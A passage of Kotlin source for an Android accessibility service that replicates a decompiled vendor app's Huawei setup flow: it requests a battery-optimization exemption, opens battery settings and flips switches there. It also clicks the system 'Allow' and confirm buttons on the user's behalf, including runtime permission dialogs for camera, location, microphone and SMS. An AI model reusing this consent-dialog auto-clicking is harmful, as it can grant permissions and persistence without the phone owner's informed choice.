     *      "Ignore","Close","Don't optimize","Allow","OK","Don't remind","Got it"]`
     *  - L2619-2671 最多 30 轮主循环（每轮 100ms）：
     *      * PowerManager.isIgnoringBatteryOptimizations 若 true → f2 标记 + log 成功 + return
     *      * 否则依次调用 `m212160a3(keyword, exact=true)` (→ replica `clickTextOnCurrentRoot`),
     *        命中即 break inner loop + log "点击: <keyword>" + delay 100ms
     *  - L2671 最终 `delay(100L)` 收尾
     *
     * ADAPT:
     *  - SharedPreferences `m212193f0` / `m212195f2` 短路 + 标记未复刻：T5 实现 HuaweiPageDetector
     *    时确认 `m212193f0` 是 SP 查询而非页面判定（见 HuaweiPageDetector.kt 类 doc），SP 持久化
     *    整体下推到 T16；本 step 每次调用都会走完整流程，幂等性由 `isIgnoringBatteryOptimizations()`
     *    保证。
     *  - `isIgnoringBatteryOptimizations` 抽为 open 成员方法以便测试（Robolectric 下 PowerManager
     *    stub 复杂，spy override 更直接）。
     *  - Intent flags 276824064 = `0x10800000 | 0x04000000 | 0x00000000`；等价位：
     *    FLAG_ACTIVITY_NEW_TASK (0x10000000) | FLAG_ACTIVITY_CLEAR_TOP (0x04000000) |
     *    FLAG_ACTIVITY_NO_HISTORY (0x40000000)? 精确位拆分见源码 L2564；复刻 `setFlags(276824064)`
     *    原始整数以 1:1 保留行为（避免误拆位）。
     *  - `service.startActivity(intent)` 对齐 vendor L2565 `this.f55063a1.startActivity(intent)`；
     *    service==null 时回退 `context.startActivity(intent)`（vendor 无此 fallback，但 replica
     *    的单测路径需要）。
     */
    @Suppress("UNUSED_PARAMETER")
    open suspend fun executeStep2BatteryWhitelist(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i("HuaweiSteps", "[Step2/10] enter executeStep2BatteryWhitelist")
        HuaweiStepLogger.phase(2, "检查是否已忽略电池优化", "vendor L2544", logs)

        // ADAPT: 真机幂等 — 若 STEP2_BATTERY_WHITELIST 24h 内已 mark 直接跳过
        if (HuaweiStepCompletionStore.isCompleted(context, HuaweiStepCompletionStore.Keys.STEP2_BATTERY_WHITELIST)) {
            HuaweiStepLogger.skip(2, "SP STEP2_BATTERY_WHITELIST 24h 内已 mark", logs)
            successes.add("[Step2/10] 电池白名单已配置（SP 幂等跳过）")
            return
        }

        // Vendor L2551-2557 快路径：已在白名单 → 成功返回
        try {
            if (isIgnoringBatteryOptimizations()) {
                logs.add("[Step2/10] 已在白名单中 (vendor L2554)")
                successes.add("[Step2/10] 电池白名单已存在")
                // ADAPT: 真机幂等 — 系统已在白名单时同时写 SP mark
                HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP2_BATTERY_WHITELIST)
                return
            }
        } catch (e: Exception) {
            logs.add("[Step2/10] 检查失败: ${e.message} (vendor L2559)")
        }

        // Vendor L2561-2565 请求加入白名单
        logs.add("[Step2/10] 请求加入白名单 (vendor L2561)")
        try {
            val intent = Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS").apply {
                data = Uri.parse("package:${context.packageName}")
                // ADAPT: vendor L2564 `setFlags(276824064)` 原样保留以对齐。
                setFlags(276824064)
            }
            val launcher: Context = service ?: context
            launcher.startActivity(intent)
            logs.add("[Step2/10] 已发送电池优化豁免请求 (vendor L2565)")
        } catch (e: Exception) {
            // Vendor L2539 外层 try/catch 吞掉 Exception 仅 log；replica 同时记 failures 以便
            // 上层 orchestrator 统计。
            failures.add("[Step2/10] 启动失败: ${e.message}")
            logs.add("[Step2/10] 电池白名单请求失败: ${e.message}")
            return
        }

        // Vendor L2568 等待弹窗 300ms
        delay(300L)

        // Vendor L2581-2608 最多 6 次 100ms 轮询等待弹窗文本 keyword 出现
        val detectKeywords = listOf("忽略", "电池", "优化", "Ignore", "Battery", "Optimize")
        var dialogSeen = false
        for (i in 0 until 6) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val texts = HuaweiPageDetector.collectTexts(root)
                if (texts.any { t -> detectKeywords.any { kw -> t.contains(kw, ignoreCase = true) } }) {
                    dialogSeen = true
                    break
                }
            }
            delay(100L)
        }
        if (!dialogSeen) {
            logs.add("[Step2/10] 弹窗未出现，可能已经在白名单中 (vendor L2611)")
        }

        // Vendor L2619-2671 主循环，最多 30 次
        for (i in 0 until 30) {
            // Vendor L2627-2631 / L2662-2672 循环开始先验 PowerManager
            try {
                if (isIgnoringBatteryOptimizations()) {
                    logs.add("[Step2/10] 验证成功：已加入白名单 (vendor L2628)")
                    successes.add("[Step2/10] 电池白名单已加入")
                    // ADAPT: 真机幂等 — 主循环验证成功，写 SP mark
                    HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP2_BATTERY_WHITELIST)
                    delay(100L) // vendor L2671 收尾等待
                    return
                }
            } catch (_: Exception) {
                // PowerManager 异常不致命，继续尝试点击
            }

            // ADAPT: Task 5 — 优先使用 BatteryDialogKeywords.CONFIRM_TEXTS 电池弹窗专用确认词，
            // 对齐 vendor L2616/2726 approval keyword list (14 条)。命中一次即 break 进入下一轮。
            var clicked = false
            for (kw in BatteryDialogKeywords.CONFIRM_TEXTS) {
                if (clickTextOnCurrentRoot(kw, exact = true)) {
                    logs.add("[Step2/10] 点击: $kw (BatteryDialogKeywords, vendor L2682)")
                    clicked = true
                    break
                }
            }
            // Vendor L2693/L2700：无论是否 clicked，均 delay 100ms 再进入下一轮
            // ADAPT: 我们用单一 delay 而非 vendor 的两分支 suspend resume。
            delay(100L)
            // i 自然递增；无需 clicked 标志回传（vendor 是否 clicked 仅影响其内部
            // resume continuation，不影响外层迭代计数）。
            @Suppress("UNUSED_EXPRESSION") clicked
        }

        // 30 次后最终再验一次
        try {
            if (isIgnoringBatteryOptimizations()) {
                logs.add("[Step2/10] 30 轮后验证：已加入白名单")
                successes.add("[Step2/10] 电池白名单已加入")
                // ADAPT: 真机幂等 — 30 轮后验证成功，写 SP mark
                HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP2_BATTERY_WHITELIST)
            } else {
                logs.add("[Step2/10] 电池优化豁免未确认（30 轮后仍未加入白名单）")
            }
        } catch (e: Exception) {
            logs.add("[Step2/10] 最终验证异常: ${e.message}")
        }
    }

    /**
     * Vendor C0365a2 L2551-2557 / L2625-2629 — `PowerManager.isIgnoringBatteryOptimizations(pkg)`.
     *
     * Extracted as open method so tests can spy/override without having to stub
     * `Context.getSystemService(POWER_SERVICE)` (Robolectric PowerManager shadow on
     * some SDK levels does not expose isIgnoringBatteryOptimizations cleanly).
     */
    open fun isIgnoringBatteryOptimizations(): Boolean {
        val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager ?: return false
        return pm.isIgnoringBatteryOptimizations(context.packageName)
    }

    /**
     * Vendor C0365a2 m212160a3 (L868-891) — `clickText(str, exact)`.
     *
     * Find `text` nodes via `root.findAccessibilityNodeInfosByText`, walk visible matches,
     * compare text (exact or substring both-directions when `exact==false`), then perform
     * click using [performClickOnNodeOrAncestors] (vendor m212198f5).
     *
     * ADAPT:
     *  - Vendor uses `AbstractC0779a1.m213687e0(str)` (trim) before compare; we use
     *    [String.trim] as the equivalent.
     *  - Vendor's substring compare uses `AbstractC0779a1.m213652a5(a, b, false)`
     *    (`ignoreCase=false`); we keep that semantics via plain [String.contains].
     *  - Returns false safely when `service` or `rootInActiveWindow` is null — vendor
     *     L872-874 does the same early return.
     */
    /**
     * 真机验证 (2026-04-17 FIN-AL60 Android 12) — Android 原生 permissioncontroller 弹窗
     * 按 resource-id 点击"允许"按钮，适配所有 runtime dangerous 权限布局。
     *
     * 按钮 id 优先级（与 Android 12 PermissionController 源码一致）：
     *  1. permission_allow_button             — 2 按钮横排（健身/联系人/通知/电话/短信/媒体）
     *  2. permission_allow_foreground_only_button — 3 按钮竖排，仅前台（相机/位置/麦克风）
     *  3. permission_allow_one_time_button    — 3 按钮竖排，本次允许（相机/位置/麦克风 备选）
     *
     * dump 证据：`docs/cache/CACHE_yw5xud.md` + `/tmp/hw_dumps/verify_ui*.xml`
     *
     * @return 命中并点击的按钮 id 短名（"permission_allow_button" 等）或 null
     */
    private fun clickPermissionControllerAllowButton(): String? {
        val svc = service ?: return null
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return null
        val allowIds = listOf(
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button"
        )
        for (id in allowIds) {
            val nodes = try {
                root.findAccessibilityNodeInfosByViewId(id)
            } catch (_: Exception) {
                null
            } ?: continue
            for (n in nodes) {
                try {
                    if (!n.isVisibleToUser) continue
                } catch (_: Exception) {
                    // isVisibleToUser 可能在 Mockito bare mock 下抛 NPE — 跳过视觉检查
                }
                if (performClickOnNodeOrAncestors(n)) {
                    return id.substringAfterLast('/')
                }
            }
        }
        return null
    }

    internal fun clickTextOnCurrentRoot(text: String, exact: Boolean): Boolean {
        val svc = service ?: return false
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        val needle = text.trim()
        val matches = try {
            root.findAccessibilityNodeInfosByText(text)
        } catch (_: Exception) {
            return false
        } ?: return false
        for (node in matches) {
            if (!node.isVisibleToUser) continue
            val nodeText = (node.text?.toString() ?: "").trim()
            val hit = if (exact) {
                nodeText == needle
            } else {
                nodeText.contains(needle) || needle.contains(nodeText)
            }
            if (hit && performClickOnNodeOrAncestors(node)) {
                return true
            }
        }
        return false
    }

    /**
     * Vendor C0365a2 m212198f5 (L7209-7245) — click node or walk up 10 ancestors, fall back
     * to a gesture tap at the node's bounding-box centroid.
     *
     * ADAPT:
     *  - Vendor uses `SystemClock.sleep(150L)` between click and return; we omit it here
     *    because our coroutine caller inserts a `delay(300L)` after each click (vendor L3664).
     *    Adding another 150ms would double-wait.
     *  - Vendor gesture fallback (L7228-7244) is not wired here yet — Step 1's dialog has
     *    been observed to surrender to a plain click. T12 (悬浮窗) reintroduces gesture
     *    fallback via [HuaweiGestureHelper.gestureTapAwait].
     *  - Returns false on any exception (Mockito bare mocks may throw NPE on getParent()).
     */
    private fun performClickOnNodeOrAncestors(node: AccessibilityNodeInfo?): Boolean {
        if (node == null) return false
        try {
            if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                return true
            }
            var parent: AccessibilityNodeInfo? = try { node.parent } catch (_: Exception) { null }
            var depth = 0
            while (parent != null && depth < 10) {
                if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    return true
                }
                parent = try { parent.parent } catch (_: Exception) { null }
                depth++
            }
        } catch (_: Exception) {
            return false
        }
        return false
    }

    /** Try launching each component in order. */
    internal fun launchComponentActivity(components: List<ComponentName>): Boolean {
        for (component in components) {
            try {
                val intent = Intent().apply {
                    this.component = component
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                return true
            } catch (_: Exception) { continue }
        }
        return false
    }

    // =========================================================================
    // Step 3/10 — 电池设置 (vendor m212165b2, L2050-2511)
    // =========================================================================

    /**
     * Vendor C0365a2 m212165b2 (L2050-2511) — 电池设置 Step 3/10.
     *
     * Vendor flow (distilled from the coroutine state-machine decompile):
     *
     *  case 0 — entry:
     *    1. SP short-circuit: `m212193f0(f55070a8)` → if already done, skip (L2099).
     *    2. Outer retry loop `i7 = 1..2` (max 2 tries):
     *       a. `m212197f4()` (openSettingsWithVerify) → **true=fail, false=success** (L2111).
     *          On fail → mark SP f55070a8 & return.
     *       b. `m212174c1()` (findAndClickBattery) — click "电池" text (L2132).
     *          On fail → delay 100ms, increment retry, continue outer loop.
     *       c. delay(800L) (L2152).
     *       d. `m212189e3()` (isOnBatteryPage) (L2153).
     *          If NOT on page → log "未进入电池页面". If i7 >= 2 → mark SP f55070a8 & return.
     *          Else delay 100ms, increment retry, continue outer loop.
     *       e. `m212184d8()` (handlePerformanceAndPowerSaving) (L2174).
     *       f. delay(100L), mark SP f55067a5 (L2180).
     *       g. Inner loop `i5 = 1..2` → `m212206g3(3, "更多电池设置", ...)` (L2191).
     *          scrollAndClick tries 3 scroll passes to find "更多电池设置".
     *          If found → delay 100ms → `m212190e5()` isOnMoreBatterySettingsPage (L2217).
     *          If on page → mark SP f55068a6 → `m212208g6("休眠时始终保持网络连接", true)` (L2240).
     *                       delay 100ms → mark SP f55069a7 → log done.
     *          If NOT found → `service.performGlobalAction(GLOBAL_ACTION_BACK=1)` → delay 100ms
     *                       → retry `m212197f4()` (L2201-2207).
     *  case 16 / after inner loop completion → mark SP f55070a8.
     *
     * ADAPT:
     *  - SP `m212193f0`/`m212195f2` short-circuit and markers replaced by `isStep3Completed()`
     *    (returns false always until T16 adds SharedPreferences). All 4 SP keys (f55067a5..a8)
     *    are tracked as companion constants; their assignment is deferred to T16.
     *  - `openSettingsWithVerify`, `findAndClickBattery`, `isOnBatteryPage`,
     *    `handlePerformanceAndPowerSaving`, `scrollAndClickMoreBatterySettings`,
     *    `isOnMoreBatterySettingsPage`, `toggleNetworkSwitch` are `open` to allow
     *    Mockito spy overrides in tests without complex UI setup.
     *  - Retry logic: vendor outer loop uses `i7 = 1; i7 < 3` (so max 2 iterations).
     *    Inner loop `i5 = 1; i5 < 3` (max 2 inner retries per outer attempt).
     *  - delay() calls use the same ms values as vendor continuations.
     */
    @Suppress("UNUSED_PARAMETER")
    open suspend fun executeStep3BatterySettings(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i("HuaweiSteps", "[Step3/10] enter executeStep3BatterySettings")
        HuaweiStepLogger.phase(3, "电池设置开始", "vendor m212165b2 L2099", logs)

        // ADAPT: vendor-alignment P2 — 若上次已整体完成，24h 内直接跳过
        if (HuaweiStepCompletionStore.isCompleted(context, HuaweiStepCompletionStore.Keys.STEP3_OVERALL)) {
            HuaweiStepLogger.skip(3, "已完成 (STEP3_OVERALL 24h 内 mark)", logs)
            return
        }

        if (isStep3Completed()) {
            HuaweiStepLogger.skip(3, "SP network_on_sleep 已标记完成", logs)
            return
        }

        val maxOuterRetry = 2 // vendor: i7 = 1; i7 < 3
        var outerAttempt = 1
        while (outerAttempt <= maxOuterRetry) {
            logs.add("[Step3/10] 第 $outerAttempt 次尝试 (vendor L2106)")

            // Vendor L2111: openSettingsWithVerify — returns true=FAILED, false=OK
            val openFailed = try { openSettingsWithVerify() } catch (e: Exception) {
                logs.add("[Step3/10] openSettings 异常: ${e.message}")
                true
            }
            if (openFailed) {
                logs.add("[Step3/10] 打开设置失败 (vendor L2114)")
                if (outerAttempt >= maxOuterRetry) {
                    // Vendor L2116: mark SP f55070a8 & return
                    logs.add("[Step3/10] 2次尝试均失败，标记完成并退出 (vendor L2116)")
                    return
                }
                delay(100L) // vendor L2122
                outerAttempt++
                continue
            }

            // Vendor L2128: openSettings succeeded
            logs.add("[Step3/10] 步骤2: 找电池 (vendor L2128)")

            // Vendor L2132: findAndClickBattery
            val batteryFound = try { findAndClickBattery() } catch (e: Exception) {
                logs.add("[Step3/10] findAndClickBattery 异常: ${e.message}")
                false
            }
            if (!batteryFound) {
                logs.add("[Step3/10] 找电池失败，重新打开设置页 (vendor L2135)")
                if (outerAttempt >= maxOuterRetry) {
                    logs.add("[Step3/10] 2次找电池均失败，标记完成并退出")
                    return
                }
                try { openSettingsWithVerify() } catch (_: Exception) { }
                delay(1500L)
                outerAttempt++
                continue
            }

            // Vendor L2152: delay 800ms then isOnBatteryPage
            delay(800L) // vendor L2152 b81.m210571b1(800L, ...)
            val onBatteryPage = try { isOnBatteryPage() } catch (_: Exception) { false }
            if (!onBatteryPage) {
                logs.add("[Step3/10] 未进入电池页面 (vendor L2154)")
                if (outerAttempt >= maxOuterRetry) {
                    logs.add("[Step3/10] 2次尝试均失败，标记完成并退出 (vendor L2156-2157)")
                    return
                }
                logs.add("[Step3/10] 重新整个流程（第 ${outerAttempt + 1} 次）(vendor L2160)")
                delay(100L) // vendor L2164 b81.m210571b1(100L, ...)
                outerAttempt++
                continue
            }

            // Vendor L2170: on battery page
            logs.add("[Step3/10] 步骤3: 处理性能模式和省电模式 (vendor L2170)")
            try { handlePerformanceAndPowerSaving() } catch (_: Exception) { }

            // Vendor L2180: delay 100ms
            delay(100L) // vendor L2178 b81.m210571b1(100L, ...)
            // FIX 2026-04-17: 这里只是进入电池页，**不**应该 mark "Step3 done" —— 后续步骤还可能失败
            HuaweiStepLogger.probe(3, "phase", "entered-battery-page (not marking SP yet)")
            HuaweiStepLogger.phase(3, "滚动查找'更多电池设置'", "vendor L2181", logs)

            // Inner loop: vendor i5 = 1; i5 < 3 (max 2 inner retries)
            var innerAttempt = 1
            val maxInnerRetry = 2 // vendor: i5 < 3
            var innerDone = false
            while (innerAttempt <= maxInnerRetry && !innerDone) {
                logs.add("[Step3/10] 第 $innerAttempt 次尝试进入更多电池设置 (vendor L2185)")

                // Vendor L2191: scrollAndClick(3, "更多电池设置", ...) — 3 scroll passes, exact=true
                val moreBatteryFound = try {
                    scrollAndClickMoreBatterySettings()
                } catch (e: Exception) {
                    logs.add("[Step3/10] scrollAndClick 异常: ${e.message}")
                    false
                }

                if (!moreBatteryFound) {
                    // Vendor L2200-2207: not found → performGlobalAction(BACK) → delay 100ms → retry openSettings
                    logs.add("[Step3/10] 未进入更多电池设置，重新打开设置 (vendor L2200)")
                    try { service?.performGlobalAction(1) } catch (_: Exception) { } // GLOBAL_ACTION_BACK = 1
                    delay(100L) // vendor L2207 b81.m210571b1(100L, ...)
                    // Re-open settings (vendor L2263: retry m212197f4)
                    val reOpenFailed = try { openSettingsWithVerify() } catch (_: Exception) { true }
                    if (reOpenFailed) {
                        logs.add("[Step3/10] 重新打开设置失败")
                        innerAttempt++
                        continue
                    }
                    innerAttempt++
                    continue
                }

                // Vendor L2214-2215: found → delay 100ms, check isOnMoreBatterySettingsPage
                delay(100L) // vendor L2215 b81.m210571b1(100L, ...)
                val onMorePage = try { isOnMoreBatterySettingsPage() } catch (_: Exception) { false }
                if (onMorePage) {
                    HuaweiStepLogger.probe(3, "phase", "entered-more-battery-settings (not marking SP yet)")
                    HuaweiStepLogger.phase(3, "步骤5: 开启'休眠时始终保持网络连接'", "vendor L2239", logs)
                    val toggled = try { toggleNetworkSwitch() } catch (_: Exception) { false }
                    HuaweiStepLogger.probe(3, "toggleNetworkSwitch result", toggled)
                    delay(100L) // vendor L2244 b81.m210571b1(100L, ...)
                    // FIX 2026-04-17: mark ONLY 当 toggle 真正生效 —— 这是 Step 3 唯一的最终目标
                    // 即使 toggled=false（开关已是目标状态），也 mark —— 因为语义等价（状态已达成）
                    // TODO: 若 toggleNetworkSwitch 返回 false 不可区分 "已达成" vs "失败"，需要补 verify 读取当前开关状态
                    if (toggled) {
                        HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP3_NETWORK_ON_SLEEP)
                        HuaweiStepLogger.success(3, "电池设置已完成", "休眠网络保持开关已切换", successes)
                    } else {
                        // ADAPT: 真机加固 — toggleSwitchByText 返回 false 时主动 verify 当前开关状态
                        // 若已 checked=true, 视为已达目标 mark SP; 否则真的是找不到节点, warn
                        val alreadyOn = try { verifyNetworkSwitchChecked() } catch (_: Exception) { false }
                        if (alreadyOn) {
                            HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP3_NETWORK_ON_SLEEP)
                            HuaweiStepLogger.probe(3, "toggleNetworkSwitch verify", "已处于目标状态 (isChecked=true), mark 完成")
                            successes.add("[Step3/10] 休眠保持网络已开启（verify 幂等）")
                        } else {
                            HuaweiStepLogger.warn(3, "toggleNetworkSwitch 未切换且 verify 未开启", "可能不在更多电池设置页", logs)
                        }
                    }
                    innerDone = true
                    break
                } else {
                    logs.add("[Step3/10] 未进入更多电池设置，重试 (vendor L2250)")
                    try { service?.performGlobalAction(1) } catch (_: Exception) { }
                    delay(100L)
                    innerAttempt++
                }
            }

            if (!innerDone) {
                // Vendor L2223-2225: inner loop exhausted → if i7 >= 2 → mark SP f55070a8 & return
                logs.add("[Step3/10] 无法进入更多电池设置，跳过 (vendor L2223)")
                if (outerAttempt >= maxOuterRetry) {
                    logs.add("[Step3/10] 2次尝试均失败，标记完成并退出 (vendor L2225)")
                    return
                }
                delay(100L) // vendor L2231
                outerAttempt++
                continue
            }

            // Inner loop done — exit outer
            break
        }

        // FIX 2026-04-17: 流程出口 **不** 无条件 mark。mark 已在 `toggled=true` 分支内完成。
        // 若流程退到这里而 network_on_sleep 未 mark，说明没真正 toggle → 下次应重试整个 Step 3。
        HuaweiStepLogger.phase(3, "流程结束", "vendor case 16 f55070a8", logs)

        // ADAPT: vendor-alignment P2 — 3 subkeys 全部 mark 时聚合 STEP3_OVERALL
        // 对齐 vendor f55070a8 = "battery_completed"
        //
        // Cross-run semantics (intentional, vendor-aligned):
        //   STEP3_PERFORMANCE_MODE / STEP3_POWER_SAVING / STEP3_NETWORK_ON_SLEEP 每个都带
        //   24h TTL。此处读 isCompleted 聚合，意味着 "过去 24h 内三个子步骤都成功过" 即视为
        //   Step3 整体完成，即便不是同一 executeAll 调用链内。
        //   vendor battery_completed 同样依赖 SP 跨 session 持久化；replica 保持此行为。
        //   风险: 若 OS 或用户在 24h 内撤回某项设置，下次 executeAll 会因 STEP3_OVERALL 跳过
        //   整个 Step 3。TTL (24h) 是唯一防线。
        //
        // Only reached via inner-done break (所有其他 exit 都是 early return)。聚合只在
        // 本 session 网络 toggle 成功且先前 session performance+power_saving 在 TTL 内时触发。
        val subkeysAllDone = HuaweiStepCompletionStore.isCompleted(context, HuaweiStepCompletionStore.Keys.STEP3_PERFORMANCE_MODE)
            && HuaweiStepCompletionStore.isCompleted(context, HuaweiStepCompletionStore.Keys.STEP3_POWER_SAVING)
            && HuaweiStepCompletionStore.isCompleted(context, HuaweiStepCompletionStore.Keys.STEP3_NETWORK_ON_SLEEP)
        if (subkeysAllDone) {
            HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP3_OVERALL)
            HuaweiStepLogger.probe(3, "mark-step3-overall", "battery_completed (f55070a8) 已标记")
            logs.add("║ [Step3/10] STEP3_OVERALL marked")
        }
    }

    // ---- Step 3 open helpers (extracted for testability) ----

    /**
     * Vendor m212193f0(f55070a8) — SharedPreferences 完成标记查询.
     *
     * 接入 [HuaweiStepCompletionStore]。
     * FIX 2026-04-17: 改为检查**最终目标** `STEP3_NETWORK_ON_SLEEP`（而非入口 BATTERY_SETTINGS），
     * 确保只有在"休眠时始终保持网络连接"开关真正切换后，才算 Step 3 完成。之前 bug：
     * 进入电池页就 mark BATTERY_SETTINGS，即便后续 toggle 失败，下次启动仍 skip。
     * Open so tests can override via spy.
     */
    open fun isStep3Completed(): Boolean =
        HuaweiStepCompletionStore.isCompleted(context, HuaweiStepCompletionStore.Keys.STEP3_NETWORK_ON_SLEEP)

    /**
     * Vendor m212197f4 (L6920) — openSettingsWithVerify.
     * Opens android.settings.SETTINGS, retries up to 3 times, verifies on settings home page.
     *
     * Returns **true = FAILED** (cannot open / verify settings), **false = success**.
     * This inverted boolean matches vendor's return convention exactly.
     *
     * ADAPT: Simplified replica. Vendor has fold-screen special path, back-button navigation,
     * and isAtSettingsTop() check. Replica calls launchComponentActivity with ACTION_SETTINGS
     * intent and returns true on exception.
     */
    open fun openSettingsWithVerify(): Boolean {
        // ADAPT: vendor m212197f4 uses android.settings.SETTINGS + FLAG 1350631424
        // (= FLAG_ACTIVITY_CLEAR_TOP | FLAG_ACTIVITY_SINGLE_TOP | FLAG_ACTIVITY_NEW_TASK)
        return try {
            val intent = Intent("android.settings.SETTINGS").apply {
                flags = 1350631424
            }
            val launcher: android.content.Context = service ?: context
            launcher.startActivity(intent)
            false // success
        } catch (_: Exception) {
            true // failed
        }
    }

    /**
     * Vendor m212174c1 (L5910) — findAndClickBattery.
     * Uses clickTextOnCurrentRoot("电池", exact=false).
     * If not found immediately, scrolls once then retries.
     *
     * Returns true = found+clicked, false = not found.
     */
    open suspend fun findAndClickBattery(): Boolean {
        val svc = service ?: return false
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { return false } ?: return false
        // ADAPT: 真机加固 — 验证当前窗口确实是设置页面，防止进程重生时 rootInActiveWindow 指向 app 自身界面导致误匹配
        val pkg = root.packageName?.toString() ?: ""
        if (pkg != "com.android.settings" && pkg != "com.huawei.settings" && pkg != "com.hihonor.settings") {
            HuaweiStepLogger.probe(3, "findAndClickBattery", "当前窗口非设置页面 (pkg=$pkg)，跳过")
            return false
        }
        // ADAPT: real-device hardening — 真机 FIN-AL60 HarmonyOS 4.2 "电池"在设置第二屏需要滚动。
        // BatteryEntryFinder 扩展 keyword + vendor 原版滚动重试。
        val node = BatteryEntryFinder.find(root)
        if (node != null) {
            HuaweiStepLogger.probe(3, "findAndClickBattery matched (首屏)",
                (node.text ?: node.contentDescription ?: "").toString())
            return performClickOnNodeOrAncestors(node)
        }
        // 首屏没找到 → 最多滚动 3 次，每次等 800ms 让 UI 刷新（真机 dump 确认"电池"在第 2 屏）
        HuaweiStepLogger.probe(3, "findAndClickBattery", "首屏未找到，开始滚动查找 (max 3 scroll)")
        for (scrollAttempt in 1..3) {
            try {
                val scrollTarget = findFirstScrollableNode(root)
                if (scrollTarget != null) {
                    scrollTarget.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
                } else {
                    val svc = service
                    if (svc != null) {
                        val w = getScreenWidthPx().toFloat()
                        val h = getScreenHeightPx().toFloat()
                        val path = android.graphics.Path().apply {
                            moveTo(w * 0.5f, h * 0.7f)
                            lineTo(w * 0.5f, h * 0.3f)
                        }
                        val gesture = android.accessibilityservice.GestureDescription.Builder()
                            .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0L, 300L))
                            .build()
                        svc.dispatchGesture(gesture, null, null)
                    }
                }
            } catch (_: Exception) { }
            delay(800L) // 等 scroll 动画 + UI 刷新
            val rootAfter = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: continue
            val node2 = BatteryEntryFinder.find(rootAfter)
            if (node2 != null) {
                HuaweiStepLogger.probe(3, "findAndClickBattery matched (scroll $scrollAttempt)",
                    (node2.text ?: node2.contentDescription ?: "").toString())
                return performClickOnNodeOrAncestors(node2)
            }
        }
        HuaweiStepLogger.probe(3, "findAndClickBattery", "3 次滚动后仍未找到")
        return false
    }

    /**
     * Vendor m212189e3 (L6678) — isOnBatteryPage.
     * Uses HuaweiPageDetector.isOnBatteryPage(root).
     */
    open fun isOnBatteryPage(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        return HuaweiPageDetector().isOnBatteryPage(root)
    }

    /**
     * Vendor m212184d8 (L6450) — handlePerformanceAndPowerSaving.
     *
     * Vendor semantics (coroutine SM):
     *  - case 0: log "开启性能模式", toggleSwitch("性能模式", true), delay 100ms
     *  - loop (up to 4 iterations): look for confirm keywords
     *    ["开启","确定","确认","允许","開啟","確定","確認","允許"] on current root,
     *    click if visible.
     *  - After loop: toggleSwitch("省电模式", false) — turn OFF power-save mode.
     *
     * ADAPT: Replica simplifies the confirm-click loop to a single attempt per keyword
     * (vendor retries up to 4 times). All UI side-effects happen on the service root.
     * `open` for test spy override.
     */
    open fun handlePerformanceAndPowerSaving() {
        // Vendor L6475-6476: log + toggleSwitch("性能模式", true)
        val performanceToggled = toggleSwitchByText("性能模式", targetChecked = true)
        // FIX 2026-04-17 (P2-3): mark STEP3_PERFORMANCE_MODE 仅当 toggle 真正生效。
        // 语义对齐 STEP3_NETWORK_ON_SLEEP mark 纪律（HuaweiSteps.kt:1042-1043）：
        // toggleSwitchByText 返回 true ⇒ 成功找到开关并 performAction(ACTION_CLICK) 或 ACTION_SET_SELECTION。
        // 返回 false ⇒ 未找到节点 / 节点不可点击 / 已处于目标状态（不可区分），保守不 mark。
        // TODO: VENDOR_VERIFY — 若 "已处于目标状态" 需要 mark（vendor 语义未明确），
        // 需补 verify 读取当前开关状态。当前走保守路径，与 STEP3_NETWORK_ON_SLEEP 一致。

        // Vendor L6563: confirm keywords list
        val confirmKeywords = listOf("开启", "确定", "确认", "允许", "開啟", "確定", "確認", "允許")
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
        if (root != null) {
            for (kw in confirmKeywords) {
                val nodes = try { root.findAccessibilityNodeInfosByText(kw) } catch (_: Exception) { null }
                if (nodes.isNullOrEmpty()) continue
                for (n in nodes) {
                    if (n.isVisibleToUser && n.isClickable) {
                        n.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                        break
                    }
                }
            }
        }

        // ADAPT: vendor-alignment P2 — mark STEP3_PERFORMANCE_MODE 在 confirm-dialog 处理完毕后
        // 避免 dialog 被拒导致 switch 回滚但 mark 已写入的 race。
        // 若 toggle 返回 true 且 dialog loop 未抛异常 → 视为操作成功。
        if (performanceToggled) {
            HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP3_PERFORMANCE_MODE)
        }

        // Vendor L6506: toggleSwitch("省电模式", false) — turn off power-save
        val powerSavingToggled = toggleSwitchByText("省电模式", targetChecked = false)
        // FIX 2026-04-17 (P2-3): mark STEP3_POWER_SAVING 仅当 toggle 真正生效（与 performance 同纪律）。
        if (powerSavingToggled) {
            HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP3_POWER_SAVING)
        }
    }

    /**
     * Vendor m212206g3(3, "更多电池设置", ..., true) (L7415) — scrollAndClick.
     * Scrolls up to 3 times to find and click "更多电池设置" (exact=true).
     *
     * Returns true = found+clicked.
     * `open` for test spy override.
     */
